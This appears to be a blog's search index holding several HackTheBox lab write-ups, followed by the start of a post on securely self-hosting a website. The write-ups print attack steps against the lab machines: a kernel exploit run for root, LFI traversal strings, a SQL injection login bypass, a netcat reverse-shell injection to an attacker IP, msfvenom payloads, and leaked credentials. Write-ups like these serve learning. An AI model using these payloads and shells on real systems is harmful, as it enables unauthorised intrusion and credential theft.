http://10.10.14.6:8000/15704.cConnecting to 10.10.14.6:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 9487 (9.3K) [text/plain]Saving to: `15704.c'100%[======================================&gt;] 9,487       36.7K/s   in 0.3s    2018-12-04 13:35:08 (36.7 KB/s) - `15704.c' saved [9487/9487]www-data@popcorn:/dev/shm$ gcc 15704.c -o fml gcc 15704.c -o fmlwww-data@popcorn:/dev/shm$ chmod +x fmlchmod +x fmlwww-data@popcorn:/dev/shm$ file fmlfile fmlfml: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not strippedwww-data@popcorn:/dev/shm$ ./fml./fml[*] Resolving kernel addresses... [+] Resolved econet_ioctl to 0xf840a280 [+] Resolved econet_ops to 0xf840a360 [+] Resolved commit_creds to 0xc01645d0 [+] Resolved prepare_kernel_cred to 0xc01647d0[*] Calculating target...[*] Triggering payload...[*] Got root!# cat /root/root.txtcat /root/root.txt&lt;redacted&gt;# aaaaand done.",
        "url": "/htb/popcorn/"
      }
      ,
    
      "htb-poison": {
        "title": "HackTheBox - Poison",
        "author": "",
        "category": "",
        "content": "This was actually the first box i touched after getting on the htb platform. I couldnt work out how to root it at the time but after a few weeks i came back to figure it out.#Nmap scanPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)| ssh-hostkey: |   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32|_http-title: Site doesn't have a title (text/html; charset=UTF-8).The server is vulnerable to local file inclusionshttp://10.10.10.84/browse.php?file=../../../../../../../../../../../../etc/passwd# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &amp;:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &amp;:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh Theres also some other files on here that we can find by directory bruteforcing.pwdbackup.txt is also on the server.This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=Its been base64'd 13 times...charix:Charix!2#4%6&amp;8(0pwning rootchecking ps we can see that root is running vnc.root     529   0.0  0.7  23620 6636 v0- I    Mon08      0:00.12 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 12000We take the secret.zip from the server and unzip it.Since we have ssh credentials we can tunnel the data so we can use localhost to view the vnc session.ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84vncviewer 127.0.0.1:5901 -passwd secretWe can now get the root flag.",
        "url": "/htb/poison/"
      }
      ,
    
      "htb-optiumum": {
        "title": "HackTheBox - Optimum",
        "author": "",
        "category": "",
        "content": "DescriptionOptimum was a fairly basic machine that could be easily rooted with the use of public exploits and not much else.Nmap scanPORT STATE SERVICE VERSION80/tcp open http HttpFileServer http 2.3|_http-server-header: HFS 2.3|_http-title: HFS /Initial shellSimply searchsploit ‘HFS 2.3’ or search within the metasploit framework to find the vulnerability for ‘Rejetto_hfs_exec’. Set the parameters that would fit the host and execute for a user shell.Privilege escalationSince we have a meterpreter shell, we can leverage the classic ‘windows-exploit-suggester’ module. We run it and it returns some results. ‘Microsoft Windows 8.1 (x64) ‘RGNOBJ’ Integer Overflow (MS16-098)’ is one of them. We can download an executable from the offensive security github page and simply transfer and execute the binary on the host to gain SYSTEM permissions.",
        "url": "/htb/optiumum/"
      }
      ,
    
      "htb-nibbles": {
        "title": "HackTheBox - Nibbles",
        "author": "",
        "category": "",
        "content": "Another breezy box by htb that we can fly through with metasploit.Nmap scanPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).pwning userChecking the web source will show us a comment leaking a running web service. Metasploit will do the rest.&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;Module options (exploit/multi/http/nibbleblog_file_upload):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   PASSWORD   nibbles          yes       The password to authenticate with   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOST      10.10.10.75      yes       The target address   RPORT      80               yes       The target port (TCP)   SSL        false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI  /nibbleblog/     yes       The base path to the web application   USERNAME   admin            yes       The username to authenticate with   VHOST                       no        HTTP server virtual hostgetting rootA quick sudo -l check will show us the route to root.User nibbler may run the following commands on Nibbles:    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.shWe can use su with monitor.sh without a password. We can echo a bash string into the script to force a root shell is returned.echo '/bin/sh -i' &gt; monitor.shsudo /home/nibbler/personal/stuff/monitor.sh#",
        "url": "/htb/nibbles/"
      }
      ,
    
      "htb-mirai": {
        "title": "HackTheBox - Mirai",
        "author": "",
        "category": "",
        "content": "Cool box based off a cool concept that swept the earth.Nmap scanPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)| ssh-hostkey: |   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)53/tcp open  domain  dnsmasq 2.76| dns-nsid: |_  bind.version: dnsmasq-2.7680/tcp open  http    lighttpd 1.4.35|_http-server-header: lighttpd/1.4.35|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Dirsearch results[04:08:05] 200 -   61B  - /AccessPlatform/auth/clientscripts/cookies.js[04:08:05] 200 -   61B  - /AccessPlatform/auth/clientscripts/login.js[04:08:09] 301 -    0B  - /admin  -&gt;  http://10.10.10.48/admin/[04:08:10] 200 -   61B  - /admin.js[04:09:11] 200 -   14KB - /admin/?/login[04:09:11] 200 -   14KB - /admin/[04:09:11] 200 -   14KB - /admin/index.php[04:09:42] 200 -   61B  - /Brocfile.js[04:09:42] 200 -   61B  - /brunch-config.js[04:09:47] 200 -   61B  - /Citrix/AccessPlatform/auth/clientscripts/cookies.js[04:09:48] 200 -   61B  - /Citrix/AccessPlatform/auth/clientscripts/login.js[04:10:11] 200 -   61B  - /Gruntfile.js[04:10:11] 200 -   61B  - /gulpfile.js[04:10:33] 200 -   61B  - /mimosa-config.js[04:11:10] 200 -   61B  - /swfobject.js[04:11:20] 200 -   61B  - /v1/test/js/console_ajax.jsGetting userMirai was a botnet that abused iot devices with default credentials. We can try this too since the webapp leaks what the box might be.ssh pi@10.10.10.48 : raspberry (default)We can get our user flag.Getting rootA sudo check shows us the first part to getting root.pi@raspberrypi:~ $ sudo -lMatching Defaults entries for pi on localhost:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser pi may run the following commands on localhost:    (ALL : ALL) ALL    (ALL) NOPASSWD: ALLReading root.txt we get the following message.“”root.txt\"\" = 'I lost my original root.txt! I think I may have a backup on my USB stick...'We can use df to check system devices for external media.We use the df command in unix to check system devices/dev/sdb            8887      93      8078   2% /media/usbstickmounted to /dev/sdbroot@raspberrypi:/media/usbstick# cat damnit.txt Damnit! Sorry man I accidentally deleted your files off the USB stick.Do you know if there is any way to get them back?-Jamesahhhhhh more steps. Lets just grep out the filesystem for a flag.grep -a -B 35 -A 120 'root' /dev/sdbFinally we get our flag",
        "url": "/htb/mirai/"
      }
      ,
    
      "htb-legacy": {
        "title": "HackTheBox - Legacy",
        "author": "",
        "category": "",
        "content": "Nmap scanPORT     STATE  SERVICE       VERSION139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn445/tcp  open   microsoft-ds  Windows XP microsoft-ds3389/tcp closed ms-wbt-serverDevice type: general purpose|specializedRunning (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (92%), General Dynamics embedded (89%)OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_2000--sp4 cpe:/o:microsoft:windows_server_2008--sp2Aggressive OS guesses: Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (92%), Microsoft Windows XP SP2 (92%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP Professional SP2 (90%), Microsoft Windows 2000 Server (89%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_clock-skew: mean: -4h01m52s, deviation: 1h24m49s, median: -5h01m51s|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:bd:de:4a (VMware)| smb-os-discovery: |   OS: Windows XP (Windows 2000 LAN Manager)|   OS CPE: cpe:/o:microsoft:windows_xp---|   Computer name: legacy|   NetBIOS computer name: LEGACY\\x00|   Workgroup: HackTheBox --\\x00|_  System time: 2018-12-17T08:28:58+02:00| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2)pwning :zzz:Host is running what looks like xp or 2000, running with netapi enabled luckily theres a metasploit module for that‘smb/ms08_067_netapi’ lands us as root ezpz",
        "url": "/htb/legacy/"
      }
      ,
    
      "htb-lame": {
        "title": "HackTheBox - Lame",
        "author": "",
        "category": "",
        "content": ":zzz: nothing real special about this box.Nmap scanPORT    STATE SERVICE     VERSION21/tcp  open  ftp         vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: |   STAT: | FTP server status:|      Connected to 10.10.14.7|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      vsFTPd 2.3.4 - secure, fast, stable|_End of status22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)PwningUsing smbclient we connect to the boxAnonymous login successful\tSharename       Type      Comment\t---------       ----      -------\tprint$          Disk      Printer Drivers\ttmp             Disk      oh noes!\topt             Disk      \tIPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))\tADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))Metasploit module ‘multi/samba/usermap_script’\tSet remote host\tSet payload -&gt; cmd/unix/reverse_netcat\texploitBoom, we land as root gg2ez",
        "url": "/htb/lame/"
      }
      ,
    
      "htb-jerry": {
        "title": "HackTheBox -  Jerry",
        "author": "",
        "category": "",
        "content": "A very simple box with a big hint.Nmap scan8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1|_http-favicon: Apache Tomcat|_http-server-header: Apache-Coyote/1.1|_http-title: Apache Tomcat/7.0.88ExploitationAs the scan shows we have a tomcat box. Tomcat by design is an easy shell once you can login. Luckily someone made some scripts that allow that process to get easier, running a default tomcat login wordlist against the /manager login form gives us access under ‘tomcat:secr3t’. We can then upload a .WAR file with metasploits /tomcat_mgr_upload for an easy meterpreter session.There was no privesc for this box, both root and user flags were available to read at this point. Would have liked to see some method of elevation :/",
        "url": "/htb/jerry/"
      }
      ,
    
      "htb-devel": {
        "title": "HackTheBox - Devel",
        "author": "",
        "category": "",
        "content": "Nmap scanPORT   STATE SERVICE VERSION21/tcp open  ftp     Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client| 03-17-17  04:37PM                  689 iisstart.htm|_03-17-17  04:37PM               184946 welcome.png| ftp-syst: |_  SYST: Windows_NT80/tcp open  http    Microsoft IIS httpd 7.5| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: IIS7ExploitationAs the first scan shows, ftp is open and the web server is hosting the files put into ftp. We can create a aspx payload with msfvenom and upload that to test for a shellmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;X&gt; LPORT=&lt;X&gt; -f aspx -o fml.aspxOur metasploit handler returns a shell. Backgrounding the session allows us to take advantage of metasploits local_exploit/suggestor. Running this module returns some available modules that may work to get higher privileges.use exploit/windows/local/ms10_015_kitrap0dRunning this module on the backgrounded session elevates us to SYSYEM",
        "url": "/htb/devel/"
      }
      ,
    
      "htb-cronos": {
        "title": "HackTheBox -  Cronos",
        "author": "",
        "category": "",
        "content": "Nmap scanPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)| dns-nsid: |_  bind.version: 9.10.3-P4-Ubuntu80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It workspwning userThe presence of port 53 being open hinted to me that virtual host routing may be involved. Edit /etc/hosts file to add cronos.htb for a site to resolve.Resolving the host also returns ‘admin.cronos.htb’ so add that too.The admin subdomain automatically stood out so i went to the page and found a login form. Basic sql injection (‘OR 1=1# and any password) bypasses the login and allows us entry into the page. “Net Tool v0.1” allows us to input code to execute but we can inject our own by adding a semicolon after the expected address. Inject a basic bash reverse shell and run a listener to recieve a shell. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.6 1234 &gt;/tmp/f We can now grab user.txtGaining rootAs the box name suggests this proceedure may involve a cronjob. Doing a check for jobs returns the following;$ cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user\tcommand17 *\t* * *\troot    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )* * * * *\troot\tphp /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1From this it appears that root is executing the file ‘artisan’ on a regular cron. If we replace the file in this location with one under the same name it should execute as root. Placing a shell here executes when the cron triggers and gives us a shell as root.listening on [any] 9150 ...connect to [10.10.14.6] from (UNKNOWN) [10.10.10.13] 44730Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 10:57:01 up 3 days,  1:20,  0 users,  load average: 0.02, 0.01, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=0(root) gid=0(root) groups=0(root)Can now grab the root flag and cleanup.",
        "url": "/htb/cronos/"
      }
      ,
    
      "htb-blocky": {
        "title": "HackTheBox -  Blocky",
        "author": "",
        "category": "",
        "content": "Blocky was another standard box with a few potential rabbit holes to fall down. There was also a 2nd potential method of gaining information through phpmyadmin which i didnt investigate.Nmap scanPORT     STATE  SERVICE VERSION21/tcp   open   ftp     ProFTPD 1.3.5a22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))|_http-generator: WordPress 4.8|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: BlockyCraft &amp;#8211; Under Construction!8192/tcp closed sophosFull port scanPORT      STATE  SERVICE21/tcp    open   ftp22/tcp    open   ssh80/tcp    open   http8192/tcp  closed sophos25565/tcp open   minecraftWeb server directory bruteforce[06:51:41] 200 -   51KB - /[06:52:26] 301 -  309B  - /wiki  -&gt;  http://10.10.10.37/wiki/[06:52:39] 301 -  315B  - /wp-content  -&gt;  http://10.10.10.37/wp-content/[06:53:51] 301 -  312B  - /plugins  -&gt;  http://10.10.10.37/plugins/[06:54:59] 301 -  316B  - /wp-includes  -&gt;  http://10.10.10.37/wp-includes/[06:56:13] 301 -  315B  - /javascript  -&gt;  http://10.10.10.37/javascript/Directories mention ‘wp-content’ and ‘wp-includes’ which are wordpress directories so theres a solid chance we will be interacting with wordpress.User enumerationSince we know wordpress is running, we can enumerate the site with wpscan. Wpscan manages to pull the username ‘notch’ from the rss feed.Initial shellGoing back to recon through the ‘plugins’ directory we get access to a ‘cute file browser’ with 2 files:- Blockycore.jar- griefprevention.jarWe can use online decompilers to decompile the java into somewhat readable code.From the blockycore file we get credentials that are hardcoded.public class BlockyCore {public String sqlHost = \"localhost\";public String sqlUser = \"root\";public String sqlPass = \"8YsqfCTnvxAUeduzjNSXe22\";Logging in to ssh with user ‘notch’ and that password gives us our foothold and user flag.Privilege escalationA sudo check reveals instantly what our method of gaining root privs will be.notch@Blocky:~$ sudo -l[sudo] password for notch: &lt;ssh_pw&gt;Matching Defaults entries for notch on Blocky:env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser notch may run the following commands on Blocky:(ALL : ALL) ALL‘sudo su’ gives us root.",
        "url": "/htb/blocky/"
      }
      ,
    
      "htb-beep": {
        "title": "HackTheBox - Beep",
        "author": "",
        "category": "",
        "content": "Beep was a very easy box with not much to learn. Would have liked to see more complex methods included as the initial vector was different and could have led to more interesting things.Nmap scanPORT      STATE SERVICE    VERSION22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)| ssh-hostkey:|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)25/tcp    open  smtp       Postfix smtpd|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,80/tcp    open  http       Apache httpd 2.2.3|_http-server-header: Apache/2.2.3 (CentOS)|_http-title: Did not follow redirect to https://10.10.10.7/110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_pop3-capabilities: UIDL APOP LOGIN-DELAY(0) STLS AUTH-RESP-CODE EXPIRE(NEVER) TOP IMPLEMENTATION(Cyrus POP3 server v2) USER RESP-CODES PIPELINING111/tcp   open  rpcbind    2 (RPC #100000)| rpcinfo:|   program version   port/proto  service|   100000  2            111/tcp  rpcbind|   100000  2            111/udp  rpcbind|   100024  1            743/udp  status|_  100024  1            746/tcp  status143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_imap-capabilities: Completed OK RENAME URLAUTHA0001 IMAP4 NO X-NETSCAPE QUOTA SORT CONDSTORE MULTIAPPEND UNSELECT IDLE CATENATE IMAP4rev1 ACL THREAD=REFERENCES LITERAL+ RIGHTS=kxte ATOMIC NAMESPACE BINARY ID LIST-SUBSCRIBED SORT=MODSEQ MAILBOX-REFERRALS CHILDREN ANNOTATEMORE UIDPLUS THREAD=ORDEREDSUBJECT STARTTLS LISTEXT443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))| http-robots.txt: 1 disallowed entry|_/|_http-server-header: Apache/2.2.3 (CentOS)|_http-title: Elastix - Login page| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--| Not valid before: 2017-04-07T08:22:08|_Not valid after:  2018-04-07T08:22:08|_ssl-date: 2018-10-31T09:44:22+00:00; -2h00m46s from scanner time.993/tcp   open  ssl/imap   Cyrus imapd|_imap-capabilities: CAPABILITY995/tcp   open  pop3       Cyrus pop3d3306/tcp  open  mysql      MySQL (unauthorized)4445/tcp  open  upnotifyp?10000/tcp open  http       MiniServ 1.570 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).No exact OS matches for hostExploitationWe can see from the nmap scan and from navigating the page that the webserver is running elastix. A exploit-db search for elastix returns a local file inclusion that should reveal a user login and password from a config file.Elastix 2.2.0 - 'graph.php' Local File Inclusion | exploits/php_webapps/37637.plReading the exploit and grabbing the payload we can navigate back to the page and read the config file with the LFI/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;actionThere are passwords in the config file as expected, next we can change the LFI to point to /etc/passwd to check for user accounts to try ssh with.sshing into the box as root with the password from the config file works and we can collect our root and user flags.",
        "url": "/htb/beep/"
      }
      ,
    
      "htb-bashed": {
        "title": "HackTheBox - Bashed",
        "author": "",
        "category": "",
        "content": "Bashed was a very easy box, perfect for anyone getting started with htb.Nmap scanPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Arrexel's Development SiteNo exact OS matches for hostUserdirectory bruteforcing reveals /dev/phpbash.php which is by name the program listed on the index. This can also be found by tracing the devs github page.So were given a bash interface but written in php. We interact with it just the same as a normal bash shell and can already get our user flag.Privilege escalationI chose to upload a shell to the server using a http server and wget on the box, navigating to a php shell gives us our connection. A python pty shell can be spawed for a nicer environment. We notice a scriptmanager user and /scripts directory on the machine. With some su-foo we can move into be scriptmanager.sudo -u scriptmanager (sudo -u scriptmanager /bin/sh -i)Now we can access the /scripts directory we see a python script we can edit. Changing the script to contain a basic python reverse shell and opening a listener on our host will result in a shell.",
        "url": "/htb/bashed/"
      }
      ,
    
      "misc-securewebsite": {
        "title": "Securely Self-Hosting a Website",
        "author": "",
        "category": "",
        "content": "Securely Self-Hosting a WebsiteI’m using Github Pages to host this site for a few reasons, but namely that:  Since this is a static site, using Github is free and reliable  I don’t want to expose my home network any more than I have to  It’s about time I learned how Git worksAdmittedly, however, I am hosting a few unrelated basic websites from my server in my home network. After some trial and error I made a setup secure enough for me to feel confident in keeping it running. It’s nothing too complicated, but it helps me sleep better at night.1. CloudflareI’m a huge fan of Cloudflare, and it isn’t hard to see why for anyone remotely interested in self-hosting. Their free protection will proxy my IP address, that way any DNS query will go through Cloudflare’s servers without directly revealing my public IP address. This will allow me to make sure a simple DNS query won’t give someone the info they need to port scan my router or geolocate me. (Not make it impossible! But at least more difficult.) However, Cloudflare alone won’t prevent the site from being accessed directly by my public IP address. It does a great job with proxying my DNS, but when it comes to protecting my actual home network, I’m not in the clear just yet.2. NginxWith DNS secured, it’s time to make sure I’m adequately defending my home network from an adversary that already has or has found my home network’s public IP address. I’ll start with my web server.I will always use Nginx over Apache given the choice, in part because of how much simpler I find configuration. Disallowing access to my websites from an IP address is as easy as a simple server block.server {    listen      80 default_server;    listen      [--]:80 default_server;    server_name \"\";    return      444;}With this new directive, the client never sees the 444 error and Nginx will close a connection from a direct IP address, or really, anything that isn’t specifically identified in a different server block. However, I could still do better than having the connection closed at my server. I’ll take this one step further and adjust my pfSense settings.3. pfSenseAll of the traffic coming in to my network to a web server will be coming from Cloudflare. So why not only allow Cloudflare source IP addresses access to these ports? This way, the only way to access my website will be to use public DNS servers to go through Cloudflare’s proxied DNS. This too is pretty simple. In pfSense, I simply create an alias with Cloudflare’s IP 